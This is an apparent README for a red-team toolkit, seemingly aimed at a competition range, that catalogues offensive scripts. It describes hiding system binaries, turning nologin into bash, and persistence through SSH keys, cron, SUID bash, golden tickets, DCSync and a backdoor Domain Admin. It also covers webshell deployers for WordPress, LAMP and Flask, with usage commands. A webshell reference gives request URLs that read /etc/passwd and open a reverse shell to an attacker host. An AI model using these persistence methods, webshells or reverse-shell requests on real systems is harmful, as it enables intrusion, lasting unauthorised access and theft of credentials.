# Tooling descriptions

## Map
```
├── alias-bashrc.sh
├── compromise-w-who.sh
├── evil-timer
│   ├── deploy-evil-timer.sh
│   ├── python2-certbot.service
│   └── python2-certbot.timer
├── infinite-users.sh
├── no-apt.sh
├── README.md
├── reconboard-v5
│   ├── build-and-launch.sh
│   ├── data
│   │   ├── scans
│   │   │   ├── bingus-1_alltcp.txt
│   │   │   ├── Bingus-1_alltcp.txt
│   │   │   ├── bingus-1_alltcp.xml
│   │   │   ├── Bingus-1_alltcp.xml
│   │   │   ├── bingus-1_git.txt
│   │   │   ├── Bingus-1_git.txt
│   │   │   ├── bingus-1_headers.txt
│   │   │   ├── Bingus-1_headers.txt
│   │   │   ├── bingus-1_http_vuln.txt
│   │   │   ├── Bingus-1_http_vuln.txt
│   │   │   ├── Bingus-1_httpx.txt
│   │   │   ├── Bingus-1_masscan.txt
│   │   │   ├── bingus-1_nikto_full.txt
│   │   │   ├── Bingus-1_nikto_full.txt
│   │   │   ├── bingus-1_nikto.txt
│   │   │   ├── Bingus-1_nikto.txt
│   │   │   ├── Bingus-1_nmap_redis.txt
│   │   │   ├── bingus-1_nuclei_cves.txt
│   │   │   ├── Bingus-1_nuclei_cves.txt
│   │   │   ├── bingus-1_nuclei.txt
│   │   │   ├── Bingus-1_nuclei.txt
│   │   │   ├── bingus-1_quick.txt
│   │   │   ├── Bingus-1_quick.txt
│   │   │   ├── bingus-1_quick.xml
│   │   │   ├── Bingus-1_quick.xml
│   │   │   ├── Bingus-1_redis_config.txt
│   │   │   ├── Bingus-1_redis_info.txt
│   │   │   ├── Bingus-1_redis_keys.txt
│   │   │   ├── bingus-1_robots.txt
│   │   │   ├── Bingus-1_robots.txt
│   │   │   ├── bingus-1_sensitive.txt
│   │   │   ├── Bingus-1_sensitive.txt
│   │   │   ├── bingus-1_ssh_audit.txt
│   │   │   ├── bingus-1_ssl.txt
│   │   │   ├── Bingus-1_ssl.txt
│   │   │   ├── bingus-1_testssl.txt
│   │   │   ├── Bingus-1_testssl.txt
│   │   │   ├── bingus-1_udp.txt
│   │   │   ├── Bingus-1_udp.txt
│   │   │   ├── bingus-1_udp.xml
│   │   │   ├── Bingus-1_udp.xml
│   │   │   ├── bingus-1_vuln_all.txt
│   │   │   ├── Bingus-1_vuln_all.txt
│   │   │   ├── bingus-1_vuln_all.xml
│   │   │   ├── Bingus-1_vuln_all.xml
│   │   │   ├── bingus-1_whatweb.txt
│   │   │   ├── Bingus-1_whatweb.txt
│   │   │   ├── Bingus_alltcp.txt
│   │   │   ├── Bingus_alltcp.xml
│   │   │   ├── Bingus_git.txt
│   │   │   ├── Bingus_headers.txt
│   │   │   ├── Bingus_http_vuln.txt
│   │   │   ├── Bingus_nikto_full.txt
│   │   │   ├── Bingus_nikto.txt
│   │   │   ├── Bingus_nuclei_cves.txt
│   │   │   ├── Bingus_nuclei.txt
│   │   │   ├── Bingus_quick.txt
│   │   │   ├── Bingus_quick.xml
│   │   │   ├── Bingus_robots.txt
│   │   │   ├── Bingus_sensitive.txt
│   │   │   ├── Bingus_ssl.txt
│   │   │   ├── Bingus_testssl.txt
│   │   │   ├── Bingus_udp.txt
│   │   │   ├── Bingus_udp.xml
│   │   │   ├── Bingus_vuln_all.txt
│   │   │   ├── Bingus_vuln_all.xml
│   │   │   ├── Bingus_whatweb.txt
│   │   │   ├── DVWA_alltcp.txt
│   │   │   ├── DVWA_alltcp.xml
│   │   │   ├── DVWA_git.txt
│   │   │   ├── DVWA_headers.txt
│   │   │   ├── DVWA_http_vuln.txt
│   │   │   ├── DVWA_httpx.txt
│   │   │   ├── DVWA_nikto_full.txt
│   │   │   ├── DVWA_nikto.txt
│   │   │   ├── DVWA_nuclei_cves.txt
│   │   │   ├── DVWA_nuclei.txt
│   │   │   ├── DVWA_quick.txt
│   │   │   ├── DVWA_quick.xml
│   │   │   ├── DVWA_robots.txt
│   │   │   ├── DVWA_sensitive.txt
│   │   │   ├── DVWA_ssl.txt
│   │   │   ├── DVWA_testssl.txt
│   │   │   ├── DVWA_udp.txt
│   │   │   ├── DVWA_udp.xml
│   │   │   ├── DVWA_vuln_all.txt
│   │   │   ├── DVWA_vuln_all.xml
│   │   │   ├── DVWA_whatweb.txt
│   │   │   ├── osint-breach.me_alltcp.txt
│   │   │   ├── osint-breach.me_alltcp.xml
│   │   │   ├── osint-breach.me_cme.txt
│   │   │   ├── osint-breach.me_dig.txt
│   │   │   ├── osint-breach.me_headers.txt
│   │   │   ├── osint-breach.me_ldap.txt
│   │   │   ├── osint-breach.me_nikto_full.txt
│   │   │   ├── osint-breach.me_nikto.txt
│   │   │   ├── osint-breach.me_nuclei_cves.txt
│   │   │   ├── osint-breach.me_nuclei.txt
│   │   │   ├── osint-breach.me_quick.txt
│   │   │   ├── osint-breach.me_quick.xml
│   │   │   ├── osint-breach.me_robots.txt
│   │   │   ├── osint-breach.me_rpc.txt
│   │   │   ├── osint-breach.me_udp.txt
│   │   │   ├── osint-breach.me_udp.xml
│   │   │   ├── osint-breach.me_vuln_all.txt
│   │   │   ├── osint-breach.me_vuln_all.xml
│   │   │   └── osint-breach.me_whatweb.txt
│   │   └── store.json
│   ├── docker-compose.yml
│   ├── Dockerfile
│   ├── Dockerfile.worker
│   ├── entrypoint.sh
│   ├── Makefile
│   ├── README.md
│   ├── recon_server.py
│   ├── setup.sh
│   ├── static
│   ├── templates
│   │   ├── index.html
│   │   └── login.html
│   ├── worker-entrypoint.sh
│   └── worker.py
├── sinkhole-scripts.sh
├── sudo-biNOry.sh
├── the-toucher.sh
├── vandalize-bashrc.sh
└── yay-install.sh
```

## Desc
| tool name | functionality |
| --- | --- |
| compromise-w-who.sh | Moves the `w` and `who` binaries to the `/run/runit/` directory and adds a `.so` to the end for a bit more hiding, then makes a fake `who` entry and a bait `w` entry |
| evil-timer | i dunno |
| infinite-users.sh | nologin is now is symlinked in bash, meaning we can login as any user on the system with `nologin` as its shell, it will also get root perms i just need to figure that out |
| vandalize-bashrc.sh | searches the machine for .bashrc files and adds a big `:3` to them |

## TODO
- Multiple ssh binaries running on different ports
- install pihole to sinkhole github
- 20 Docker binaries all running as hidden services
- Fix the install-yay script

---

## persist/ — Deep Persistence Scripts

| Script | Targets | Methods |
|--------|---------|---------|
| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
| `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
| `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |

```bash
# Linux (any Ubuntu host)
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis (unauthenticated open Redis)
./persist/redis_persist.sh <target_ip>

# AD (after getting DA creds)
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows (run on a PS shell on target, or via CrackMapExec -X)
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
```

## webshells/ — Webshell Deployers

| Script | Target | Technique |
|--------|--------|-----------|
| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
| `webshells/deploy_wordpress_shell.sh` | svc-amazin-01 (WP 5.8.1) | Theme 404.php injection, malicious plugin upload, XML-RPC probe |
| `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
| `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |

```bash
chmod +x webshells/*.sh persist/*.sh

# WordPress
./webshells/deploy_wordpress_shell.sh <target_ip> admin <pass>

# LAMP
./webshells/deploy_lamp_shell.sh <target_ip> guest ""

# Flask/Nginx
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### shell.php quick ref (password: `rt2025!delta` — change before use)

| Action | URL |
|--------|-----|
| Command | `?p=rt2025!delta&c=id` |
| Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
| Upload | `POST ?p=rt2025!delta&act=upload` |
| Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
